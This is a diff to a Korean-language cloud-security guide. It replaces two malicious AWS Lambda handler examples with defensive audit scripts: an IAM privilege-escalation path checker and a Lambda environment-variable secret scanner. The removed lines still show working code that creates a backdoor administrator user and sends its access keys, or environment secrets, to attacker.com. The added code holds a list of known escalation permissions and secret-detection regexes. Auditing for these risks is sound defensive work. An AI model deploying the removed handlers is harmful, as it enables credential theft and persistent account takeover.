@@ -101,31 +101,189 @@ aws cloudtrail put-event-selectors --trail-name mytrail \
 ### Lambda 함수 공격
 
 ```python
-# 악성 Lambda 함수 (권한 상승)
-import boto3
-import os
+#!/usr/bin/env python3
+"""
+AWS IAM 권한 상승 경로 분석 도구 (방어 목적 — 레드팀/감사 전용)
+사용: python3 iam_privesc_check.py --profile default --region ap-northeast-2
+"""
 
-def lambda_handler(event, context):
-    # Lambda 실행 역할의 권한으로 실행
-    iam = boto3.client('iam')
-    
-    # 새 관리자 사용자 생성
-    iam.create_user(UserName='backdoor_admin')
-    iam.attach_user_policy(
-        UserName='backdoor_admin',
-        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
+from __future__ import annotations
+
+import argparse
+import json
+import sys
+from dataclasses import dataclass, field
+from typing import Optional
+
+import boto3
+from botocore.exceptions import ClientError, NoCredentialsError
+
+
+@dataclass
+class PrivEscPath:
+    permission: str
+    description: str
+    risk: str  # CRITICAL | HIGH | MEDIUM
+    remediation: str
+
+
+# 알려진 권한 상승 경로 (Rhino Security Labs 연구 기반)
+KNOWN_PRIVESC: list[PrivEscPath] = [
+    PrivEscPath("iam:CreatePolicyVersion",      "기존 정책에 신규 버전(Administrator) 추가",      "CRITICAL", "iam:CreatePolicyVersion 권한 제거"),
+    PrivEscPath("iam:SetDefaultPolicyVersion",  "이전에 저장된 고권한 정책 버전 활성화",          "CRITICAL", "iam:SetDefaultPolicyVersion 권한 제거"),
+    PrivEscPath("iam:AttachUserPolicy",          "자신에게 AdministratorAccess 정책 부여",         "CRITICAL", "권한 범위를 특정 ARN으로 제한"),
+    PrivEscPath("iam:AttachGroupPolicy",         "자신이 속한 그룹에 고권한 정책 부여",            "CRITICAL", "권한 범위를 특정 ARN으로 제한"),
+    PrivEscPath("iam:PutUserPolicy",             "인라인 정책으로 자신에게 권한 부여",             "CRITICAL", "iam:PutUserPolicy 권한 제거"),
+    PrivEscPath("iam:AddUserToGroup",            "고권한 그룹에 자신을 추가",                      "HIGH",     "권한 범위를 특정 그룹 ARN으로 제한"),
+    PrivEscPath("iam:UpdateAssumeRolePolicy",    "신뢰 정책 수정으로 고권한 역할 Assume 가능",     "HIGH",     "iam:UpdateAssumeRolePolicy 권한 제거"),
+    PrivEscPath("iam:CreateAccessKey",           "다른 IAM 사용자의 접근 키 생성",                 "HIGH",     "권한 범위를 자신의 ARN으로 제한"),
+    PrivEscPath("iam:CreateLoginProfile",        "다른 사용자 콘솔 비밀번호 설정",                 "HIGH",     "권한 범위를 자신의 ARN으로 제한"),
+    PrivEscPath("lambda:UpdateFunctionCode",     "고권한 Lambda 코드 교체 후 실행",                "HIGH",     "특정 함수 ARN으로 범위 제한"),
+    PrivEscPath("ec2:AssociateIamInstanceProfile", "EC2에 고권한 역할 프로파일 연결",              "HIGH",     "특정 인스턴스 ARN으로 제한"),
+    PrivEscPath("cloudformation:CreateStack",   "CloudFormation으로 고권한 역할 생성/사용",        "MEDIUM",   "cloudformation:CreateStack 역할 ARN 제한"),
+    PrivEscPath("glue:CreateDevEndpoint",        "Glue 개발 엔드포인트에 고권한 역할 사용",        "MEDIUM",   "Glue 역할 ARN을 제한"),
+    PrivEscPath("datapipeline:CreatePipeline",  "데이터 파이프라인으로 고권한 역할 실행",          "MEDIUM",   "datapipeline 역할 ARN 제한"),
+    PrivEscPath("iam:PassRole",                  "다른 서비스로 고권한 역할 전달",                  "MEDIUM",   "iam:PassRole 대상 역할 ARN을 엄격히 제한"),
+]
+
+
+@dataclass
+class CheckResult:
+    principal_arn: str
+    allowed_permissions: list[str] = field(default_factory=list)
+    privesc_paths: list[PrivEscPath] = field(default_factory=list)
+
+    def to_dict(self) -> dict:
+        return {
+            "principal_arn": self.principal_arn,
+            "allowed_permissions": self.allowed_permissions,
+            "privesc_paths": [
+                {
+                    "permission": p.permission,
+                    "description": p.description,
+                    "risk": p.risk,
+                    "remediation": p.remediation,
+                }
+                for p in self.privesc_paths
+            ],
+        }
+
+
+# ------------------------------------------------------------------ #
+#  권한 시뮬레이션
+# ------------------------------------------------------------------ #
+class IAMPrivEscChecker:
+    def __init__(self, session: boto3.Session) -> None:
+        self.iam = session.client("iam")
+        self.sts = session.client("sts")
+
+    def get_caller_arn(self) -> str:
+        return self.sts.get_caller_identity()["Arn"]
+
+    def simulate_permissions(
+        self,
+        principal_arn: str,
+        actions: list[str],
+        resource: str = "*",
+    ) -> list[str]:
+        """시뮬레이션으로 허용된 권한 목록 반환"""
+        allowed: list[str] = []
+        # API 한계: 한 번에 최대 100개 액션
+        chunk_size = 100
+        for i in range(0, len(actions), chunk_size):
+            chunk = actions[i : i + chunk_size]
+            try:
+                resp = self.iam.simulate_principal_policy(
+                    PolicySourceArn=principal_arn,
+                    ActionNames=chunk,
+                    ResourceArns=[resource],
+                )
+                for ev in resp.get("EvaluationResults", []):
+                    if ev.get("EvalDecision") == "allowed":
+                        allowed.append(ev["EvalActionName"])
+            except ClientError as exc:
+                if exc.response["Error"]["Code"] != "NoSuchEntity":
+                    raise
+        return allowed
+
+    def check(self, principal_arn: Optional[str] = None) -> CheckResult:
+        if principal_arn is None:
+            principal_arn = self.get_caller_arn()
+
+        actions = [p.permission for p in KNOWN_PRIVESC]
+        print(f"[*] 권한 시뮬레이션: {principal_arn}", file=sys.stderr)
+        allowed = self.simulate_permissions(principal_arn, actions)
+
+        allowed_set = set(allowed)
+        result = CheckResult(principal_arn=principal_arn, allowed_permissions=allowed)
+        result.privesc_paths = [p for p in KNOWN_PRIVESC if p.permission in allowed_set]
+        return result
+
+
+# ------------------------------------------------------------------ #
+#  출력
+# ------------------------------------------------------------------ #
+def print_report(result: CheckResult, as_json: bool = False) -> None:
+    if as_json:
+        print(json.dumps(result.to_dict(), ensure_ascii=False, indent=2))
+        return
+
+    print(f"\n{'='*65}")
+    print(f"주체 ARN : {result.principal_arn}")
+    print(f"허용 권한: {len(result.allowed_permissions)}개")
+    print(f"권한 상승 경로: {len(result.privesc_paths)}개")
+
+    if not result.privesc_paths:
+        print("\n[+] 권한 상승 경로 없음")
+        return
+
+    risk_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2}
+    for p in sorted(result.privesc_paths, key=lambda x: risk_order.get(x.risk, 9)):
+        color = {"CRITICAL": "\033[91m", "HIGH": "\033[93m", "MEDIUM": "\033[94m"}.get(p.risk, "")
+        reset = "\033[0m"
+        print(f"\n  [{color}{p.risk}{reset}] {p.permission}")
+        print(f"    설명: {p.description}")
+        print(f"    조치: {p.remediation}")
+
+
+# ------------------------------------------------------------------ #
+#  CLI
+# ------------------------------------------------------------------ #
+def build_parser() -> argparse.ArgumentParser:
+    parser = argparse.ArgumentParser(
+        description="AWS IAM 권한 상승 경로 분석 도구 (감사/레드팀 전용)",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="예시:\n"
+               "  python3 iam_privesc_check.py --profile default\n"
+               "  python3 iam_privesc_check.py --profile audit --arn arn:aws:iam::123:user/bob\n"
+               "  python3 iam_privesc_check.py --profile default --json",
     )
-    
-    # 접근 키 생성
-    keys = iam.create_access_key(UserName='backdoor_admin')
-    
-    # 외부로 전송
-    import urllib.request
-    urllib.request.urlopen(
-        f"http://attacker.com/exfil?key={keys['AccessKey']['AccessKeyId']}&secret={keys['AccessKey']['SecretAccessKey']}"
-    )
-    
-    return {"statusCode": 200}
+    parser.add_argument("--profile", default="default", help="AWS CLI 프로파일 (기본: default)")
+    parser.add_argument("--region", default="ap-northeast-2", help="AWS 리전")
+    parser.add_argument("--arn", metavar="ARN", help="분석할 주체 ARN (미지정 시 현재 자격증명)")
+    parser.add_argument("--json", action="store_true", help="JSON 형식 출력")
+    return parser
+
+
+def main() -> None:
+    parser = build_parser()
+    args = parser.parse_args()
+
+    try:
+        session = boto3.Session(profile_name=args.profile, region_name=args.region)
+        checker = IAMPrivEscChecker(session)
+        result = checker.check(principal_arn=args.arn)
+        print_report(result, as_json=args.json)
+    except NoCredentialsError:
+        print("[-] AWS 자격증명 없음 — aws configure 실행 후 재시도", file=sys.stderr)
+        sys.exit(1)
+    except ClientError as exc:
+        print(f"[-] AWS API 오류: {exc}", file=sys.stderr)
+        sys.exit(1)
+
+
+if __name__ == "__main__":
+    main()
 ```
 
 ---
@@ -298,26 +456,199 @@ cat /output
 ## 5. 서버리스 공격
 
 ```python
-# Lambda 환경변수 탈취
-import os
-import urllib.request
+#!/usr/bin/env python3
+"""
+AWS Lambda 환경변수 시크릿 노출 감사 도구 (방어 목적)
+사용: python3 lambda_secret_audit.py --profile default --region ap-northeast-2
+"""
 
-def lambda_handler(event, context):
-    # 환경변수에 저장된 시크릿 탈취
-    secrets = {k: v for k, v in os.environ.items() 
-               if any(x in k.upper() for x in 
-                      ['SECRET', 'KEY', 'TOKEN', 'PASSWORD', 'DB_'])}
-    
-    # 외부 전송
-    data = str(secrets).encode()
-    req = urllib.request.Request(
-        "http://attacker.com/exfil",
-        data=data,
-        method="POST"
+from __future__ import annotations
+
+import argparse
+import json
+import re
+import sys
+from dataclasses import dataclass, field
+from typing import Optional
+
+import boto3
+from botocore.exceptions import ClientError, NoCredentialsError
+
+
+# 민감 키 패턴
+_SENSITIVE_KEY_RE = re.compile(
+    r"(?i)(secret|password|passwd|api[_-]?key|token|credential|db[_-]?pass|"
+    r"private[_-]?key|access[_-]?key|auth|jwt|bearer|certificate)"
+)
+
+# 알려진 시크릿 값 패턴 (하드코딩된 값 탐지)
+_SECRET_VALUE_RE = re.compile(
+    r"(?i)(AKIA[0-9A-Z]{16}|"                  # AWS Access Key ID
+    r"[0-9a-zA-Z/+]{40}|"                       # AWS Secret Key 길이
+    r"eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.|"    # JWT
+    r"ghp_[A-Za-z0-9]{36}|"                    # GitHub PAT
+    r"sk-[A-Za-z0-9]{32,})"                    # OpenAI 등
+)
+
+
+@dataclass
+class FunctionFinding:
+    function_name: str
+    function_arn: str
+    runtime: str
+    role: str
+    sensitive_env_vars: list[dict] = field(default_factory=list)
+    hardcoded_secrets: list[dict] = field(default_factory=list)
+
+    @property
+    def has_issues(self) -> bool:
+        return bool(self.sensitive_env_vars or self.hardcoded_secrets)
+
+    def to_dict(self) -> dict:
+        return {
+            "function_name": self.function_name,
+            "function_arn": self.function_arn,
+            "runtime": self.runtime,
+            "role": self.role,
+            "sensitive_env_vars": self.sensitive_env_vars,
+            "hardcoded_secrets": self.hardcoded_secrets,
+        }
+
+
+class LambdaSecretAuditor:
+    def __init__(self, session: boto3.Session) -> None:
+        self.lmb = session.client("lambda")
+        self.findings: list[FunctionFinding] = []
+
+    def _paginate_functions(self):
+        paginator = self.lmb.get_paginator("list_functions")
+        for page in paginator.paginate():
+            yield from page.get("Functions", [])
+
+    def _analyze_env_vars(
+        self, env_vars: dict[str, str], function_name: str
+    ) -> tuple[list[dict], list[dict]]:
+        sensitive: list[dict] = []
+        hardcoded: list[dict] = []
+
+        for key, value in env_vars.items():
+            if _SENSITIVE_KEY_RE.search(key):
+                entry = {"key": key, "value_preview": value[:8] + "..." if len(value) > 8 else value}
+                sensitive.append(entry)
+
+                # 하드코딩된 실제 시크릿 값 탐지
+                if _SECRET_VALUE_RE.search(value):
+                    hardcoded.append({
+                        "key": key,
+                        "pattern_matched": True,
+                        "recommendation": "AWS Secrets Manager 또는 SSM Parameter Store로 이전",
+                    })
+
+        return sensitive, hardcoded
+
+    def audit(self) -> list[FunctionFinding]:
+        print("[*] Lambda 함수 목록 조회 중...", file=sys.stderr)
+        count = 0
+        for fn in self._paginate_functions():
+            count += 1
+            name = fn["FunctionName"]
+            arn = fn["FunctionArn"]
+            runtime = fn.get("Runtime", "unknown")
+            role = fn.get("Role", "")
+
+            try:
+                cfg = self.lmb.get_function_configuration(FunctionName=arn)
+            except ClientError:
+                continue
+
+            env = cfg.get("Environment", {}).get("Variables", {})
+            if not env:
+                continue
+
+            sensitive, hardcoded = self._analyze_env_vars(env, name)
+
+            if sensitive:
+                finding = FunctionFinding(
+                    function_name=name,
+                    function_arn=arn,
+                    runtime=runtime,
+                    role=role,
+                    sensitive_env_vars=sensitive,
+                    hardcoded_secrets=hardcoded,
+                )
+                self.findings.append(finding)
+
+        print(f"[*] {count}개 함수 분석 완료", file=sys.stderr)
+        return self.findings
+
+
+# ------------------------------------------------------------------ #
+#  출력
+# ------------------------------------------------------------------ #
+def print_report(findings: list[FunctionFinding], as_json: bool = False) -> None:
+    issues = [f for f in findings if f.has_issues]
+
+    if as_json:
+        print(json.dumps([f.to_dict() for f in issues], ensure_ascii=False, indent=2))
+        return
+
+    print(f"\n{'='*65}")
+    print(f"문제 있는 함수: {len(issues)}개")
+
+    for finding in issues:
+        print(f"\n  함수: {finding.function_name}")
+        print(f"  ARN : {finding.function_arn}")
+        print(f"  런타임: {finding.runtime}")
+        if finding.sensitive_env_vars:
+            print(f"  민감 환경변수 ({len(finding.sensitive_env_vars)}개):")
+            for ev in finding.sensitive_env_vars:
+                icon = "!!" if any(h["key"] == ev["key"] for h in finding.hardcoded_secrets) else " "
+                print(f"    [{icon}] {ev['key']} = {ev['value_preview']}")
+        if finding.hardcoded_secrets:
+            print(f"  하드코딩 의심 항목:")
+            for hc in finding.hardcoded_secrets:
+                print(f"    - {hc['key']}: {hc['recommendation']}")
+
+    if not issues:
+        print("[+] 민감 환경변수 노출 없음")
+
+
+# ------------------------------------------------------------------ #
+#  CLI
+# ------------------------------------------------------------------ #
+def build_parser() -> argparse.ArgumentParser:
+    parser = argparse.ArgumentParser(
+        description="Lambda 환경변수 시크릿 노출 감사 도구",
+        epilog="예시:\n"
+               "  python3 lambda_secret_audit.py --profile default\n"
+               "  python3 lambda_secret_audit.py --profile prod --region us-east-1 --json",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
     )
-    urllib.request.urlopen(req, timeout=5)
-    
-    return {"statusCode": 200}
+    parser.add_argument("--profile", default="default", help="AWS 프로파일")
+    parser.add_argument("--region", default="ap-northeast-2", help="AWS 리전")
+    parser.add_argument("--json", action="store_true", help="JSON 출력")
+    return parser
+
+
+def main() -> None:
+    parser = build_parser()
+    args = parser.parse_args()
+
+    try:
+        session = boto3.Session(profile_name=args.profile, region_name=args.region)
+        auditor = LambdaSecretAuditor(session)
+        findings = auditor.audit()
+        print_report(findings, as_json=args.json)
+    except NoCredentialsError:
+        print("[-] AWS 자격증명 없음", file=sys.stderr)
+        sys.exit(1)
+    except ClientError as exc:
+        print(f"[-] AWS 오류: {exc}", file=sys.stderr)
+        sys.exit(1)
+
+
+if __name__ == "__main__":
+    main()
 ```
 
 ---
